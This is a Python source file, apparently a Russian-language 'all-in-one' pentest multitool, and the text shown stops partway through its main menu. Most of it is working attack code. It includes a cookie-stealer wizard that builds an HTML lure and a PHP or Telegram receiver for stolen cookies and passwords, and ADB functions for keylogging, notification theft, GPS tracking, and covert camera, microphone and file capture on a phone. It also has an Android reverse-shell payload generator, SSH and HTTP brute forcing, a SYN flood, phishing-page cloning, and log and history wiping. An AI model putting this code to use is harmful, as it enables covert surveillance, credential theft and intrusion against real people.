#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🔧 ALL-IN-ONE TOOL v6.1 — Мультитул для пентеста
# Termux / Windows / Linux
# 50+ функций | Кейлогер | GPS | Мастер куки | Авточистка

import os, sys, json, time, subprocess, socket, random, shutil
from pathlib import Path
from datetime import datetime

DATA = "tool_data"
os.makedirs(DATA, exist_ok=True)
SESSIONS_FILE = f"{DATA}/sessions.json"
AUTO_CLEAN = True

# ==================== АВТО-ОЧИСТКА ====================
def auto_clean():
    if not AUTO_CLEAN: return
    if os.path.exists('/data/data/com.termux'):
        os.system('rm -rf /data/data/com.termux/files/home/.bash_history 2>/dev/null')
        os.system('history -c 2>/dev/null')
    for f in [f'{DATA}/sniffed.txt', f'{DATA}/dns.txt']:
        if os.path.exists(f) and os.path.getsize(f) > 1000000: os.remove(f)
    os.system('ip neigh flush all 2>/dev/null')
    os.system('arp -d * 2>nul')

def full_clean():
    print("🧹 ПОЛНАЯ ОЧИСТКА...")
    os.system('rm -rf /data/data/com.termux/files/home/.bash_history 2>/dev/null')
    os.system('rm -rf /data/data/com.termux/files/home/.zsh_history 2>/dev/null')
    os.system('rm -rf /data/data/com.termux/files/home/.python_history 2>/dev/null')
    os.system('history -c 2>/dev/null')
    os.system('ndc resolver clearnetdns 2>/dev/null')
    os.system('ipconfig /flushdns 2>nul')
    os.system('ip neigh flush all 2>/dev/null')
    os.system('arp -d * 2>nul')
    os.system(f'rm -rf {DATA}/*.tmp 2>/dev/null')
    os.system('rm -rf /data/data/com.termux/cache/* 2>/dev/null')
    os.system('termux-clipboard-set "" 2>/dev/null')
    print("✅ ВСЕ СЛЕДЫ ОЧИЩЕНЫ")

def stealth_mode():
    global AUTO_CLEAN; AUTO_CLEAN = True
    print("🕵️ РЕЖИМ НЕВИДИМКИ АКТИВЕН")

def safe_run(func, *args, **kwargs):
    try: result = func(*args, **kwargs); auto_clean(); return result
    except Exception as e: auto_clean(); print(f"❌ {e}"); return None

# ==================== УСТАНОВКА ====================
def install_all():
    print("📦 УСТАНОВКА...")
    if sys.platform == 'win32':
        os.system('pip install requests pycryptodome python-nmap colorama psutil')
        return print("✅ Windows")
    os.system('pkg update -y && pkg upgrade -y')
    os.system('pkg install python nmap tcpdump ffmpeg termux-api git wget curl -y')
    os.system('pip install requests pycryptodome python-nmap colorama psutil')
    os.system('pkg install hydra aircrack-ng hashcat exiftool -y 2>/dev/null')
    print("✅ ГОТОВО!")

# ==================== СЕТЬ ====================
def scan_ports():
    os.system(f'nmap -T4 -F {input("🎯 Цель: ").strip()}')

def scan_deep():
    os.system(f'nmap -T4 -A -O {input("🎯 Цель: ").strip()}')

def scan_wifi():
    print("📡 Сканирую Wi-Fi...")
    if sys.platform == 'win32': os.system('netsh wlan show networks')
    else:
        r = os.popen('cmd wifi list-scan-results 2>/dev/null').read()
        if r.strip(): print(r)
        else:
            r = os.popen('dumpsys wifi 2>/dev/null | grep -E "SSID|RSSI" | head -20').read()
            if r.strip(): print(r)
            else: print("❌ Не удалось. Смотри в Настройках → Wi-Fi")

def arp_scan():
    os.system('arp -a')

def fake_ap():
    print("📡 ФЕЙК ТОЧКА\n   ⚠️ Только для теста!")
    if input("Продолжить? (да/нет): ").strip().lower() not in ['да','yes','y']: print("❌ Отмена"); return
    has_root = 'uid=0' in os.popen('su -c id 2>/dev/null').read() if sys.platform != 'win32' else False
    ssid = input("📶 Название: ").strip() or "Free_WiFi"
    if has_root: os.system(f'su -c "cmd wifi start-softap {ssid} open"'); print(f"✅ {ssid}")
    else: print(f"📱 Включи в Настройках: {ssid} / Открытая"); input("ENTER когда готово...")

def sniff_http():
    print("👂 HTTP... Ctrl+C стоп")
    os.system(f'tcpdump -i any -A "tcp port 80 or tcp port 8080" >> {DATA}/sniffed.txt 2>&1')

def sniff_dns():
    print("🌐 DNS... Ctrl+C стоп")
    os.system(f'tcpdump -i any -A "port 53" >> {DATA}/dns.txt 2>&1')

def find_cameras():
    print("📷 Сканирую...")
    base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3])
    cameras = []
    for port in [80,554,8080,8899,37777,8000,8554]:
        for i in range(1,255):
            ip = f"{base}.{i}"
            try:
                s = socket.socket(); s.settimeout(0.2)
                if s.connect_ex((ip,port)) == 0: print(f"  ✅ {ip}:{port}"); cameras.append({"ip":ip,"port":port})
                s.close()
            except: pass
    with open(f'{DATA}/cameras.json','w') as f: json.dump(cameras,f,indent=2)
    print(f"✅ {len(cameras)}")

def view_cameras():
    if not os.path.exists(f'{DATA}/cameras.json'): print("❌ Сначала сканируй"); return
    with open(f'{DATA}/cameras.json') as f: cameras = json.load(f)
    for i,c in enumerate(cameras): print(f"  {i+1}. {c['ip']}:{c['port']}")
    try: num = int(input("\n🎥 Номер: ")) - 1; cam = cameras[num]
    except: print("❌"); return
    url = f"rtsp://{cam['ip']}:{cam['port']}/live" if cam['port'] in [554,8554] else f"http://{cam['ip']}:{cam['port']}/video"
    os.system(f'ffplay -x 640 -y 480 -window_title "Камера {cam["ip"]}" "{url}" 2>/dev/null')

def save_stream():
    if not os.path.exists(f'{DATA}/cameras.json'): print("❌ Сначала сканируй"); return
    with open(f'{DATA}/cameras.json') as f: cameras = json.load(f)
    for i,c in enumerate(cameras): print(f"  {i+1}. {c['ip']}:{c['port']}")
    try: num = int(input("\n🎥 Номер: ")) - 1; cam = cameras[num]
    except: print("❌"); return
    out = f"{DATA}/record_{cam['ip'].replace('.','_')}_{int(time.time())}.mp4"
    url = f"rtsp://{cam['ip']}:{cam['port']}/live" if cam['port'] in [554,8554] else f"http://{cam['ip']}:{cam['port']}/video"
    print("📹 60 сек... Ctrl+C стоп")
    try: os.system(f'ffmpeg -i "{url}" -t 60 -c copy "{out}" 2>/dev/null'); print(f"✅ {out}")
    except KeyboardInterrupt: print(f"\n✅ {out}")

# ==================== ADB / СЕССИИ ====================
def load_sessions():
    return json.load(open(SESSIONS_FILE,'r')) if os.path.exists(SESSIONS_FILE) else {}

def save_sessions(s): 
    with open(SESSIONS_FILE,'w') as f: json.dump(s,f,indent=2)

def check_adb():
    r = os.popen('adb devices 2>/dev/null').read()
    for l in r.split('\n'):
        if l.strip() and 'List' not in l:
            return l.split()[0], 'unauthorized' not in l
    return None, False

def wait_for_device():
    print("🔌 Жду USB... (отладка USB включена?)")
    for i in range(30,0,-1):
        s, ok = check_adb()
        if s:
            if ok: print(f"\n✅ {s}"); return s, True
            else: print("\n⚠️ Нажми ОК на телефоне!"); input("ENTER..."); s, ok = check_adb()
            if ok: print(f"✅ {s}"); return s, True
        print(f"\r   {i} сек", end=''); time.sleep(1)
    print("\n❌ Не подключено"); return None, False

def get_device_info(serial):
    info = {'serial': serial}
    for k, c in [('model','ro.product.model'),('brand','ro.product.manufacturer'),('android','ro.build.version.release')]:
        info[k] = os.popen(f'adb -s {serial} shell getprop {c} 2>/dev/null').read().strip() or '?'
    info['root'] = 'uid=0' in os.popen(f'adb -s {serial} shell su -c id 2>/dev/null').read()
    try: info['battery'] = os.popen(f'adb -s {serial} shell dumpsys battery 2>/dev/null | grep level').read().split(':')[1].strip() + '%'
    except: info['battery'] = '?'
    return info

# ==================== ОПАСНЫЕ ФУНКЦИИ ====================
def keylogger_realtime(serial):
    print("⌨️ КЕЙЛОГЕР RT | Ctrl+C стоп")
    os.system(f'adb -s {serial} shell su -c "getevent -lt /dev/input/event0" 2>/dev/null &')
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        os.system(f'adb -s {serial} shell su -c "killall getevent" 2>/dev/null'); print("\n⏹️")

def steal_notifications(serial):
    print("📨 УВЕДОМЛЕНИЯ | Ctrl+C стоп")
    try:
        while True:
            os.system(f'adb -s {serial} shell dumpsys notification --noredact 2>/dev/null | grep -E "NotificationRecord|tickerText|title|text" | head -10')
            time.sleep(3)
    except KeyboardInterrupt: print("\n⏹️")

def gps_tracker(serial):
    print("📍 GPS | Ctrl+C стоп")
    try:
        while True:
            os.system(f'adb -s {serial} shell dumpsys location 2>/dev/null | grep -E "latitude|longitude" | head -2')
            time.sleep(5)
    except KeyboardInterrupt: print("\n⏹️")

def camera_schedule(serial):
    interval = input("Интервал (сек, 30): ").strip() or "30"
    print(f"📷 Каждые {interval} сек | Ctrl+C стоп")
    try:
        while True:
            ts = int(time.time())
            os.system(f'adb -s {serial} shell su -c "am start -n com.android.camera/.Camera --ez extra_hide_ui true" 2>/dev/null')
            time.sleep(2)
            os.system(f'adb -s {serial} exec-out screencap -p > {DATA}/cam_{ts}.png 2>/dev/null')
            os.system(f'adb -s {serial} shell su -c "am force-stop com.android.camera" 2>/dev/null')
            print(f"  📸 {ts}")
            time.sleep(int(interval))
    except KeyboardInterrupt: print("\n⏹️")

def auto_steal_files(serial):
    print("📁 АВТО-ФАЙЛЫ | Ctrl+C стоп")
    folder = f"{DATA}/autosteal_{serial}"; os.makedirs(folder, exist_ok=True)
    try:
        while True:
            os.system(f'adb -s {serial} pull /sdcard/DCIM {folder}/ 2>/dev/null')
            os.system(f'adb -s {serial} pull /sdcard/Download {folder}/ 2>/dev/null')
            print(f"  📁 {datetime.now().strftime('%H:%M:%S')}")
            time.sleep(30)
    except KeyboardInterrupt: print(f"\n⏹️ {folder}")

def lock_device(serial):
    if input("Заблокировать? (да/нет): ").strip().lower() in ['да','yes','y']:
        os.system(f'adb -s {serial} shell input keyevent 26 2>/dev/null'); print("✅")

def fake_password_screen(serial):
    os.system(f'adb -s {serial} shell am start -a android.intent.action.MAIN -n com.android.settings/.PasswordEntry 2>/dev/null')
    print("✅ Фейк-пароль отправлен")

# ==================== МЕНЮ УСТРОЙСТВА ====================
def device_menu(serial):
    info = get_device_info(serial)
    while True:
        print(f"""
╔══════════════════════════════════════╗
║  📱 {info['brand']} {info['model']} | Android {info['android']}
║  🔋 {info['battery']} | Root: {'✅' if info['root'] else '❌'}
╠══════════════════════════════════════╣
║  📸 БАЗА: 1.Скрин 2.Экран 3.Файлы  ║
║  4.APK 5.Инфо 6.Приложения          ║
╠══════════════════════════════════════╣
║  🔥 (root): 7.Кейлогер 8.Уведомл    ║
║  9.GPS 10.Камера 11.Автофайлы       ║
║  12.Камера(r) 13.Микрофон(r)        ║
╠══════════════════════════════════════╣
║  💀 14.Блокировка 15.Фейк-пароль    ║
╠══════════════════════════════════════╣
║  16.💾 Сохранить сессию              ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': os.system(f'adb -s {serial} exec-out screencap -p > {DATA}/screen_{int(time.time())}.png'); print("✅")
        elif c == '2': os.system(f'adb -s {serial} shell screenrecord /sdcard/screen.mp4 --time-limit 30'); os.system(f'adb -s {serial} pull /sdcard/screen.mp4 {DATA}/screen_{int(time.time())}.mp4'); print("✅")
        elif c == '3':
            fld = f"{DATA}/ext_{serial}"; os.makedirs(fld, exist_ok=True)
            for d in ['DCIM','Download','Pictures']: os.system(f'adb -s {serial} pull /sdcard/{d} {fld}/ 2>/dev/null')
            print(f"✅ {fld}")
        elif c == '4':
            apk = input("📦 APK: ").strip()
            if os.path.exists(apk): os.system(f'adb -s {serial} install {apk}'); print("✅")
            else: print("❌")
        elif c == '5':
            for k,v in info.items(): print(f"  {k}: {v}")
        elif c == '6': os.system(f'adb -s {serial} shell pm list packages 2>/dev/null | head -30')
        elif c == '7': safe_run(keylogger_realtime, serial)
        elif c == '8': safe_run(steal_notifications, serial)
        elif c == '9': safe_run(gps_tracker, serial)
        elif c == '10': safe_run(camera_schedule, serial)
        elif c == '11': safe_run(auto_steal_files, serial)
        elif c == '12':
            if info['root']: os.system(f'adb -s {serial} shell su -c "am start -n com.android.camera/.Camera --ez extra_hide_ui true" 2>/dev/null'); print("✅")
            else: print("❌ root")
        elif c == '13':
            if info['root']:
                os.system(f'adb -s {serial} shell su -c "arecord -d 30 /sdcard/audio.wav" 2>/dev/null')
                os.system(f'adb -s {serial} pull /sdcard/audio.wav {DATA}/audio_{int(time.time())}.wav')
                print(f"✅ {DATA}/")
            else: print("❌ root")
        elif c == '14': safe_run(lock_device, serial)
        elif c == '15': safe_run(fake_password_screen, serial)
        elif c == '16':
            name = input("💾 Имя: ").strip() or f"{info['brand']}_{info['model']}"
            s = load_sessions()
            s[name] = {'serial':serial,'model':info['model'],'brand':info['brand'],'android':info['android'],'root':info['root'],'saved':datetime.now().isoformat(),'ip':input("📡 IP: ").strip()}
            save_sessions(s)
            os.system(f'adb -s {serial} tcpip 5555 2>/dev/null')
            print(f"✅ '{name}' сохранена!")

def connect_session():
    s = load_sessions()
    if not s: print("❌ Нет сессий"); return None
    print("\n💾 СЕССИИ:"); names = list(s.keys())
    for i,n in enumerate(names): print(f"  {i+1}. {n} — {s[n].get('brand','?')} {s[n].get('model','?')}")
    try:
        num = int(input("\n📱 Номер: ")) - 1
        if num < 0: return None
        name = names[num]; ses = s[name]
    except: print("❌"); return None
    if ses.get('ip'): os.system(f'adb connect {ses["ip"]}:5555 2>/dev/null'); time.sleep(2)
    sr, ok = check_adb()
    if sr: print(f"✅ {sr}"); return sr
    print("⚠️ Подключи USB..."); sr, ok = wait_for_device(); return sr

# ==================== ВЗЛОМ ====================
def bruteforce_http():
    t = input("🎯 IP:порт: ").strip(); u = input("👤: ").strip() or "admin"
    w = input("📚: ").strip() or f"{DATA}/passwords.txt"
    if not os.path.exists(w):
        with open(w,'w') as f:
            for p in ['admin','12345','password','admin123','root','guest']: f.write(p+'\n')
    try:
        import requests
        with open(w) as f:
            for p in f:
                p = p.strip()
                try:
                    if requests.get(f'http://{t}',auth=(u,p),timeout=3).status_code == 200: print(f"✅ {u}:{p}"); return
                except: pass
    except: pass
    print("❌")

def bruteforce_ssh():
    t = input("🎯 SSH: ").strip(); u = input("👤: ").strip() or "root"
    w = input("📚: ").strip() or f"{DATA}/passwords.txt"
    if not os.path.exists(w):
        with open(w,'w') as f:
            for p in ['root','admin','password','123456','toor']: f.write(p+'\n')
    os.system(f'hydra -l {u} -P {w} ssh://{t}')

def hash_crack(): os.system(f'hashcat -m 0 {input("📄: ").strip()} {input("📚: ").strip()}')
def search_cve(): os.system(f'searchsploit {input("🔍: ").strip()}')
def ddos(): os.system(f'hping3 -S --flood -V {input("🎯: ").strip()}')
def gen_payload():
    lh = input("📡 IP: ").strip(); lp = input("🔌: ").strip() or "4444"
    out = input("📄: ").strip() or f"{DATA}/payload.apk"
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -o {out}')
    print(f"✅ {out}")

def phishing_page():
    s = input("🌐: ").strip() or "vk.com"
    os.system(f'wget -r -l1 -p -np -k {s} 2>/dev/null'); print(f"✅ {s}/")

# ==================== ЗАЩИТА ====================
def clear_logs():
    if sys.platform == 'win32': os.system('wevtutil cl System 2>nul & wevtutil cl Security 2>nul')
    else: os.system('rm -rf /data/data/com.termux/files/home/.bash_history')
    print("✅")

def change_mac():
    m = ':'.join(['%02x'%random.randint(0,255) for _ in range(6)])
    if sys.platform == 'win32': os.system(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001" /v NetworkAddress /d {m.replace(":","")} /f')
    else: os.system(f'su -c "ip link set wlan0 address {m}"')
    print(f"🔄 {m}")

def check_root():
    print("✅ Админ" if sys.platform == 'win32' else f"{'✅ Root' if 'uid=0' in os.popen('su -c id 2>/dev/null').read() else '❌ Нет root'}")

def tor_start(): os.system('tor &'); time.sleep(3); print("✅ 127.0.0.1:9050")
def vpn_check(): os.system('curl -s ifconfig.me 2>/dev/null'); print()

# ==================== RFID/NFC ====================
def rfid_clone():
    print("📡 1.Считать 2.Эмулировать 3.Записать 4.NFC")
    c = input('>>> ').strip()
    if c == '1': os.system('pm3 -c "lf search"')
    elif c == '2': os.system(f'pm3 -c "lf em 410x emu --id {input("ID: ").strip()}"')
    elif c == '3': os.system(f'pm3 -c "lf em 410x clone --id {input("ID: ").strip()}"')
    elif c == '4': os.system('nfc-list')

def rfid_phone():
    r = os.popen('nfc-list 2>/dev/null').read()
    if r: print(f"📋 {r}"); open(f'{DATA}/rfid.txt','a').write(f"{datetime.now()}: {r}\n")
    else: print("❌")

# ==================== OSINT ====================
def osint_search():
    print("🔍 1.Телефон 2.Email 3.Ник 4.IP 5.Утечки 6.Соцсети")
    c = input('>>> ').strip()
    if c == '1': os.system(f'curl -s "https://htmlweb.ru/geo/api.php?json&telcod={input("📱 +79: ").strip()}" 2>/dev/null')
    elif c == '2': os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{input("📧: ").strip()}" 2>/dev/null')
    elif c == '3':
        u = input("👤: ").strip()
        for s in ['github.com','vk.com','t.me']: print(f"  {s}/{u}: ", end=''); os.system(f'curl -s -o /dev/null -w "%{{http_code}}" https://{s}/{u} 2>/dev/null'); print()
    elif c == '4': os.system(f'curl -s "http://ip-api.com/json/{input("IP: ").strip()}" 2>/dev/null')
    elif c == '5': os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{input("📧: ").strip()}" 2>/dev/null')
    elif c == '6': print(f"  VK: https://vk.com/search?q={input('👤: ').strip()}")

def osint_photo(): print("📷 https://images.google.com\n  https://tineye.com\n  https://yandex.ru/images/search")

# ==================== АВТО-АТАКИ ====================
def auto_attack():
    base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3])
    devices = []
    for i in range(1,255):
        ip = f"{base}.{i}"
        try:
            s = socket.socket(); s.settimeout(0.1)
            if s.connect_ex((ip,80)) == 0:
                try: host = socket.gethostbyaddr(ip)[0]
                except: host = "?"
                print(f"  ✅ {ip} — {host}"); devices.append({"ip":ip,"host":host})
            s.close()
        except: pass
    rpt = f"{DATA}/auto_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(rpt,'w') as f: json.dump({"devices":devices},f,indent=2)
    print(f"✅ {len(devices)} | 📄 {rpt}")

def auto_monitor():
    known = set()
    try:
        while True:
            base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3]); curr = set()
            for i in range(1,255):
                try:
                    s = socket.socket(); s.settimeout(0.05)
                    if s.connect_ex((f"{base}.{i}",80)) == 0: curr.add(f"{base}.{i}")
                    s.close()
                except: pass
            for ip in (curr - known): print(f"  🆕 {ip}")
            known = curr; time.sleep(10)
    except KeyboardInterrupt: print("\n⏹️")

# ==================== ДАННЫЕ ====================
def recover_files():
    for root, dirs, files in os.walk(input("📁: ").strip()):
        for f in files:
            if f.endswith(input("📝: ").strip()): print(f"  📄 {os.path.join(root, f)}")

def encrypt_file():
    fn = input("📄: ").strip(); key = input("🔑: ").strip()
    try:
        from Crypto.Cipher import AES
        with open(fn,'rb') as f: data = f.read()
        c = AES.new(key.ljust(16)[:16].encode(), AES.MODE_EAX)
        ct, tag = c.encrypt_and_digest(data)
        with open(fn+'.enc','wb') as f: [f.write(x) for x in (c.nonce,tag,ct)]
        print(f"✅ {fn}.enc")
    except Exception as e: print(f"❌ {e}")

def decrypt_file():
    fn = input("📄 .enc: ").strip(); key = input("🔑: ").strip()
    try:
        from Crypto.Cipher import AES
        with open(fn,'rb') as f: nonce,tag,ct = [f.read(x) for x in (16,16,-1)]
        c = AES.new(key.ljust(16)[:16].encode(), AES.MODE_EAX, nonce=nonce)
        data = c.decrypt_and_verify(ct,tag)
        out = fn.replace('.enc','.dec')
        with open(out,'wb') as f: f.write(data)
        print(f"✅ {out}")
    except Exception as e: print(f"❌ {e}")

def metadata():
    p = input("📷: ").strip()
    if os.path.exists(p): os.system(f'exiftool "{p}"')
    else: print("❌")

def stego_hide():
    img = input("📷: ").strip(); text = input("📝: ").strip()
    out = input("📄: ").strip() or "secret.png"
    try:
        with open(img,'rb') as f: data = bytearray(f.read())
        data.extend(b'%%HIDDEN%%' + text.encode('utf-8'))
        with open(out,'wb') as f: f.write(data)
        print(f"✅ {out}")
    except Exception as e: print(f"❌ {e}")

def stego_extract():
    try:
        with open(input("📷: ").strip(),'rb') as f: data = f.read()
        pos = data.find(b'%%HIDDEN%%')
        if pos != -1: print(f"📝 {data[pos+10:].decode('utf-8','ignore')}")
        else: print("❌ Не найдено")
    except Exception as e: print(f"❌ {e}")

def hidden_folder():
    p = f"{DATA}/{input('📁: ').strip() or '.hidden'}"; os.makedirs(p, exist_ok=True)
    if sys.platform == 'win32': os.system(f'attrib +h "{p}"')
    print(f"✅ {p}")

# ==================== МАСТЕР КРАЖИ КУКИ ====================
def cookie_stealer_wizard():
    print("""
╔══════════════════════════════════════╗
║  🍪 МАСТЕР КРАЖИ КУКИ              ║
║  Всё создаётся автоматически        ║
╚══════════════════════════════════════╝
""")
    
    print("\n📡 ШАГ 1: Куда отправлять?")
    print("   1. Есть сервер (введу адрес)")
    print("   2. Создать приёмник PHP")
    print("   3. Telegram бот")
    choice = input(">>> ").strip()
    receiver = ""
    
    if choice == '1': receiver = input("🌐 URL: ").strip()
    elif choice == '2':
        php = '''<?php
$data = $_GET['data'] ?? 'nothing';
$ip = $_SERVER['REMOTE_ADDR'] ?? '?';
file_put_contents("cookies.txt", date("H:i:s")." | $ip | $data\\n", FILE_APPEND);
header("Content-type: image/gif");
echo base64_decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");
?>
'''
        with open(f"{DATA}/steal.php",'w') as f: f.write(php)
        print(f"✅ Приёмник: {DATA}/steal.php")
        receiver = input("🌐 URL после загрузки: ").strip()
    elif choice == '3':
        bot = input("🔑 Токен бота: ").strip()
        cid = input("🆔 Chat ID: ").strip()
        receiver = f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={cid}&text="
    else: print("❌"); return
    
    print("\n🎯 ШАГ 2: Что крадём?")
    print("   1. Telegram Web  2. Все куки  3. Куки + пароли")
    target = input(">>> ").strip()
    
    print("\n📷 ШАГ 3: Приманка")
    print("   1. Картинка  2. Кнопка  3. Пусто")
    bait = input(">>> ").strip()
    
    if target == '1': steal = "var c=document.cookie;if(c.indexOf('stel_')!=-1)s(c);"
    elif target == '2': steal = "var c=document.cookie;s(c);"
    else: steal = "var c=document.cookie;var p='';document.querySelectorAll('input[type=password]').forEach(function(i){p+=i.value+','});s(c+'|PASS|'+p);"
    
    if bait == '1': bait_html = '<img src="https://picsum.photos/800/600" style="width:100%"><p style="text-align:center;color:#888">Загрузка...</p>'
    elif bait == '2': bait_html = '<button style="padding:20px 40px;font-size:20px;background:#6c5ce7;color:#fff;border:none;border-radius:10px;cursor:pointer;margin:50px auto;display:block">▶ Смотреть</button>'
    else: bait_html = '<p style="text-align:center;color:#888;margin-top:100px">Загрузка...</p>'
    
    html = f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Загрузка...</title></head>
<body style="background:#0a0a0f;font-family:Arial;">{bait_html}
<script>
function s(d){{var i=new Image();i.src="{receiver}?data="+encodeURIComponent(d+"|"+navigator.userAgent);}}
setTimeout(function(){{{steal}setTimeout(function(){{window.location="https://web.telegram.org";}},2000);}},1000);
</script></body></html>'''
    
    out = f"{DATA}/cookie_stealer_{int(time.time())}.html"
    with open(out,'w',encoding='utf-8') as f: f.write(html)
    print(f"""
╔══════════════════════════════════════╗
║  ✅ ГОТОВО!                         ║
║  📄 {out}
║  📡 {receiver}
║  1. Загрузи HTML на хостинг         ║
║  2. Отправь ссылку                  ║
║  3. Жди куки                        ║
╚══════════════════════════════════════╝
""")

# ==================== СЕРВИСЫ ====================
def whois_lookup(): os.system(f'whois {input("🌐: ").strip()}')
def ngrok_start(): os.system(f'ngrok http {input("🔌: ").strip() or "8888"}')
def self_destruct():
    print("💀 3 сек..."); time.sleep(3)
    shutil.rmtree(DATA, ignore_errors=True)
    try: os.remove(__file__)
    except: pass
    print("💀 Готово")

# ==================== ВСЕ МЕНЮ ====================
def menu_network():
    while True:
        print("""
╔══════════════════════════════════════╗
║            📡 СЕТЬ                   ║
╠══════════════════════════════════════╣
║  1.Скан портов│2.Глубокий скан      ║
║  3.Wi-Fi сети │4.ARP устройства     ║
║  5.Фейк точка │6.HTTP сниффер       ║
║  7.DNS сниффер│8.Найти камеры       ║
║  9.Смотреть   │10.Записать видео    ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(scan_ports)
        elif c == '2': safe_run(scan_deep)
        elif c == '3': safe_run(scan_wifi)
        elif c == '4': safe_run(arp_scan)
        elif c == '5': safe_run(fake_ap)
        elif c == '6': safe_run(sniff_http)
        elif c == '7': safe_run(sniff_dns)
        elif c == '8': safe_run(find_cameras)
        elif c == '9': safe_run(view_cameras)
        elif c == '10': safe_run(save_stream)

def menu_devices():
    while True:
        print("""
╔══════════════════════════════════════╗
║            📱 УСТРОЙСТВА             ║
╠══════════════════════════════════════╣
║  1.🔌 Подключить новое              ║
║  2.💾 Загрузить сессию              ║
║  3.📋 Все сессии                    ║
║  4.🗑️ Удалить сессию                ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1':
            s, ok = wait_for_device()
            if s and ok: time.sleep(2); device_menu(s)
        elif c == '2':
            s = connect_session()
            if s: device_menu(s)
        elif c == '3':
            s = load_sessions()
            if s:
                for n,i in s.items(): print(f"  📱 {n} — {i.get('brand','?')} {i.get('model','?')}")
            else: print("❌ Нет")
        elif c == '4':
            s = load_sessions()
            if s:
                names = list(s.keys())
                for i,n in enumerate(names): print(f"  {i+1}. {n}")
                try:
                    num = int(input("🗑️: ")) - 1
                    if num >= 0: del s[names[num]]; save_sessions(s); print("✅")
                except: pass

def menu_attack():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🔓 ВЗЛОМ                  ║
╠══════════════════════════════════════╣
║  1.Брут HTTP  │2.Брут SSH           ║
║  3.Хеш        │4.CVE                ║
║  5.DDoS       │6.Payload            ║
║  7.Фишинг     │0.Назад              ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(bruteforce_http)
        elif c == '2': safe_run(bruteforce_ssh)
        elif c == '3': safe_run(hash_crack)
        elif c == '4': safe_run(search_cve)
        elif c == '5': safe_run(ddos)
        elif c == '6': safe_run(gen_payload)
        elif c == '7': safe_run(phishing_page)

def menu_defense():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🛡️ ЗАЩИТА                 ║
╠══════════════════════════════════════╣
║  1.Чистка     │2.Смена MAC          ║
║  3.Проверка   │4.Tor                ║
║  5.Мой IP     │6.Полная чистка      ║
║  7.Невидимка  │0.Назад              ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(clear_logs)
        elif c == '2': safe_run(change_mac)
        elif c == '3': safe_run(check_root)
        elif c == '4': safe_run(tor_start)
        elif c == '5': safe_run(vpn_check)
        elif c == '6': safe_run(full_clean)
        elif c == '7': safe_run(stealth_mode)

def menu_rfid():
    while True:
        print("""
╔══════════════════════════════════════╗
║            📡 RFID/NFC               ║
╠══════════════════════════════════════╣
║  1.Клон RFID  │2.Чтение телефоном   ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(rfid_clone)
        elif c == '2': safe_run(rfid_phone)

def menu_osint():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🔍 OSINT                  ║
╠══════════════════════════════════════╣
║  1.Поиск инфо │2.Поиск по фото      ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(osint_search)
        elif c == '2': safe_run(osint_photo)

def menu_auto():
    while True:
        print("""
╔══════════════════════════════════════╗
║            ⚡ АВТО                   ║
╠══════════════════════════════════════╣
║  1.Авто-атака │2.Мониторинг         ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(auto_attack)
        elif c == '2': safe_run(auto_monitor)

def menu_data():
    while True:
        print("""
╔══════════════════════════════════════╗
║            💾 ДАННЫЕ                 ║
╠══════════════════════════════════════╣
║  1.Восстан.   │2.Шифрование         ║
║  3.Дешифровка │4.Метаданные         ║
║  5.Стего hide │6.Стего extract      ║
║  7.Скрытая    │8.🍪 Мастер куки     ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(recover_files)
        elif c == '2': safe_run(encrypt_file)
        elif c == '3': safe_run(decrypt_file)
        elif c == '4': safe_run(metadata)
        elif c == '5': safe_run(stego_hide)
        elif c == '6': safe_run(stego_extract)
        elif c == '7': safe_run(hidden_folder)
        elif c == '8': safe_run(cookie_stealer_wizard)

def menu_services():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🌐 СЕРВИСЫ                ║
╠══════════════════════════════════════╣
║  1.WHOIS      │2.Ngrok              ║
║  0.Назад                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(whois_lookup)
        elif c == '2': safe_run(ngrok_start)

def main():
    print("""
╔══════════════════════════════════════╗
║  🔧 ALL-IN-ONE TOOL v6.1          ║
║  50+ функций | Мастер куки         ║
╚══════════════════════════════════════╝
""")
    while True:
        print("""
╔══════════════════════════════════════╗
║         📋 ГЛАВНОЕ МЕНЮ             ║
╠══════════════════════════════════════╣
║  1.📡 СЕТЬ      2.📱 УСТРОЙСТВА    ║
║  3.🔓 ВЗЛОМ     4.🛡️ ЗАЩИТА        ║
║  5.📡 RFID/NFC  6.🔍 OSINT         ║
║  7.⚡ АВТО      8.💾 ДАННЫЕ        ║
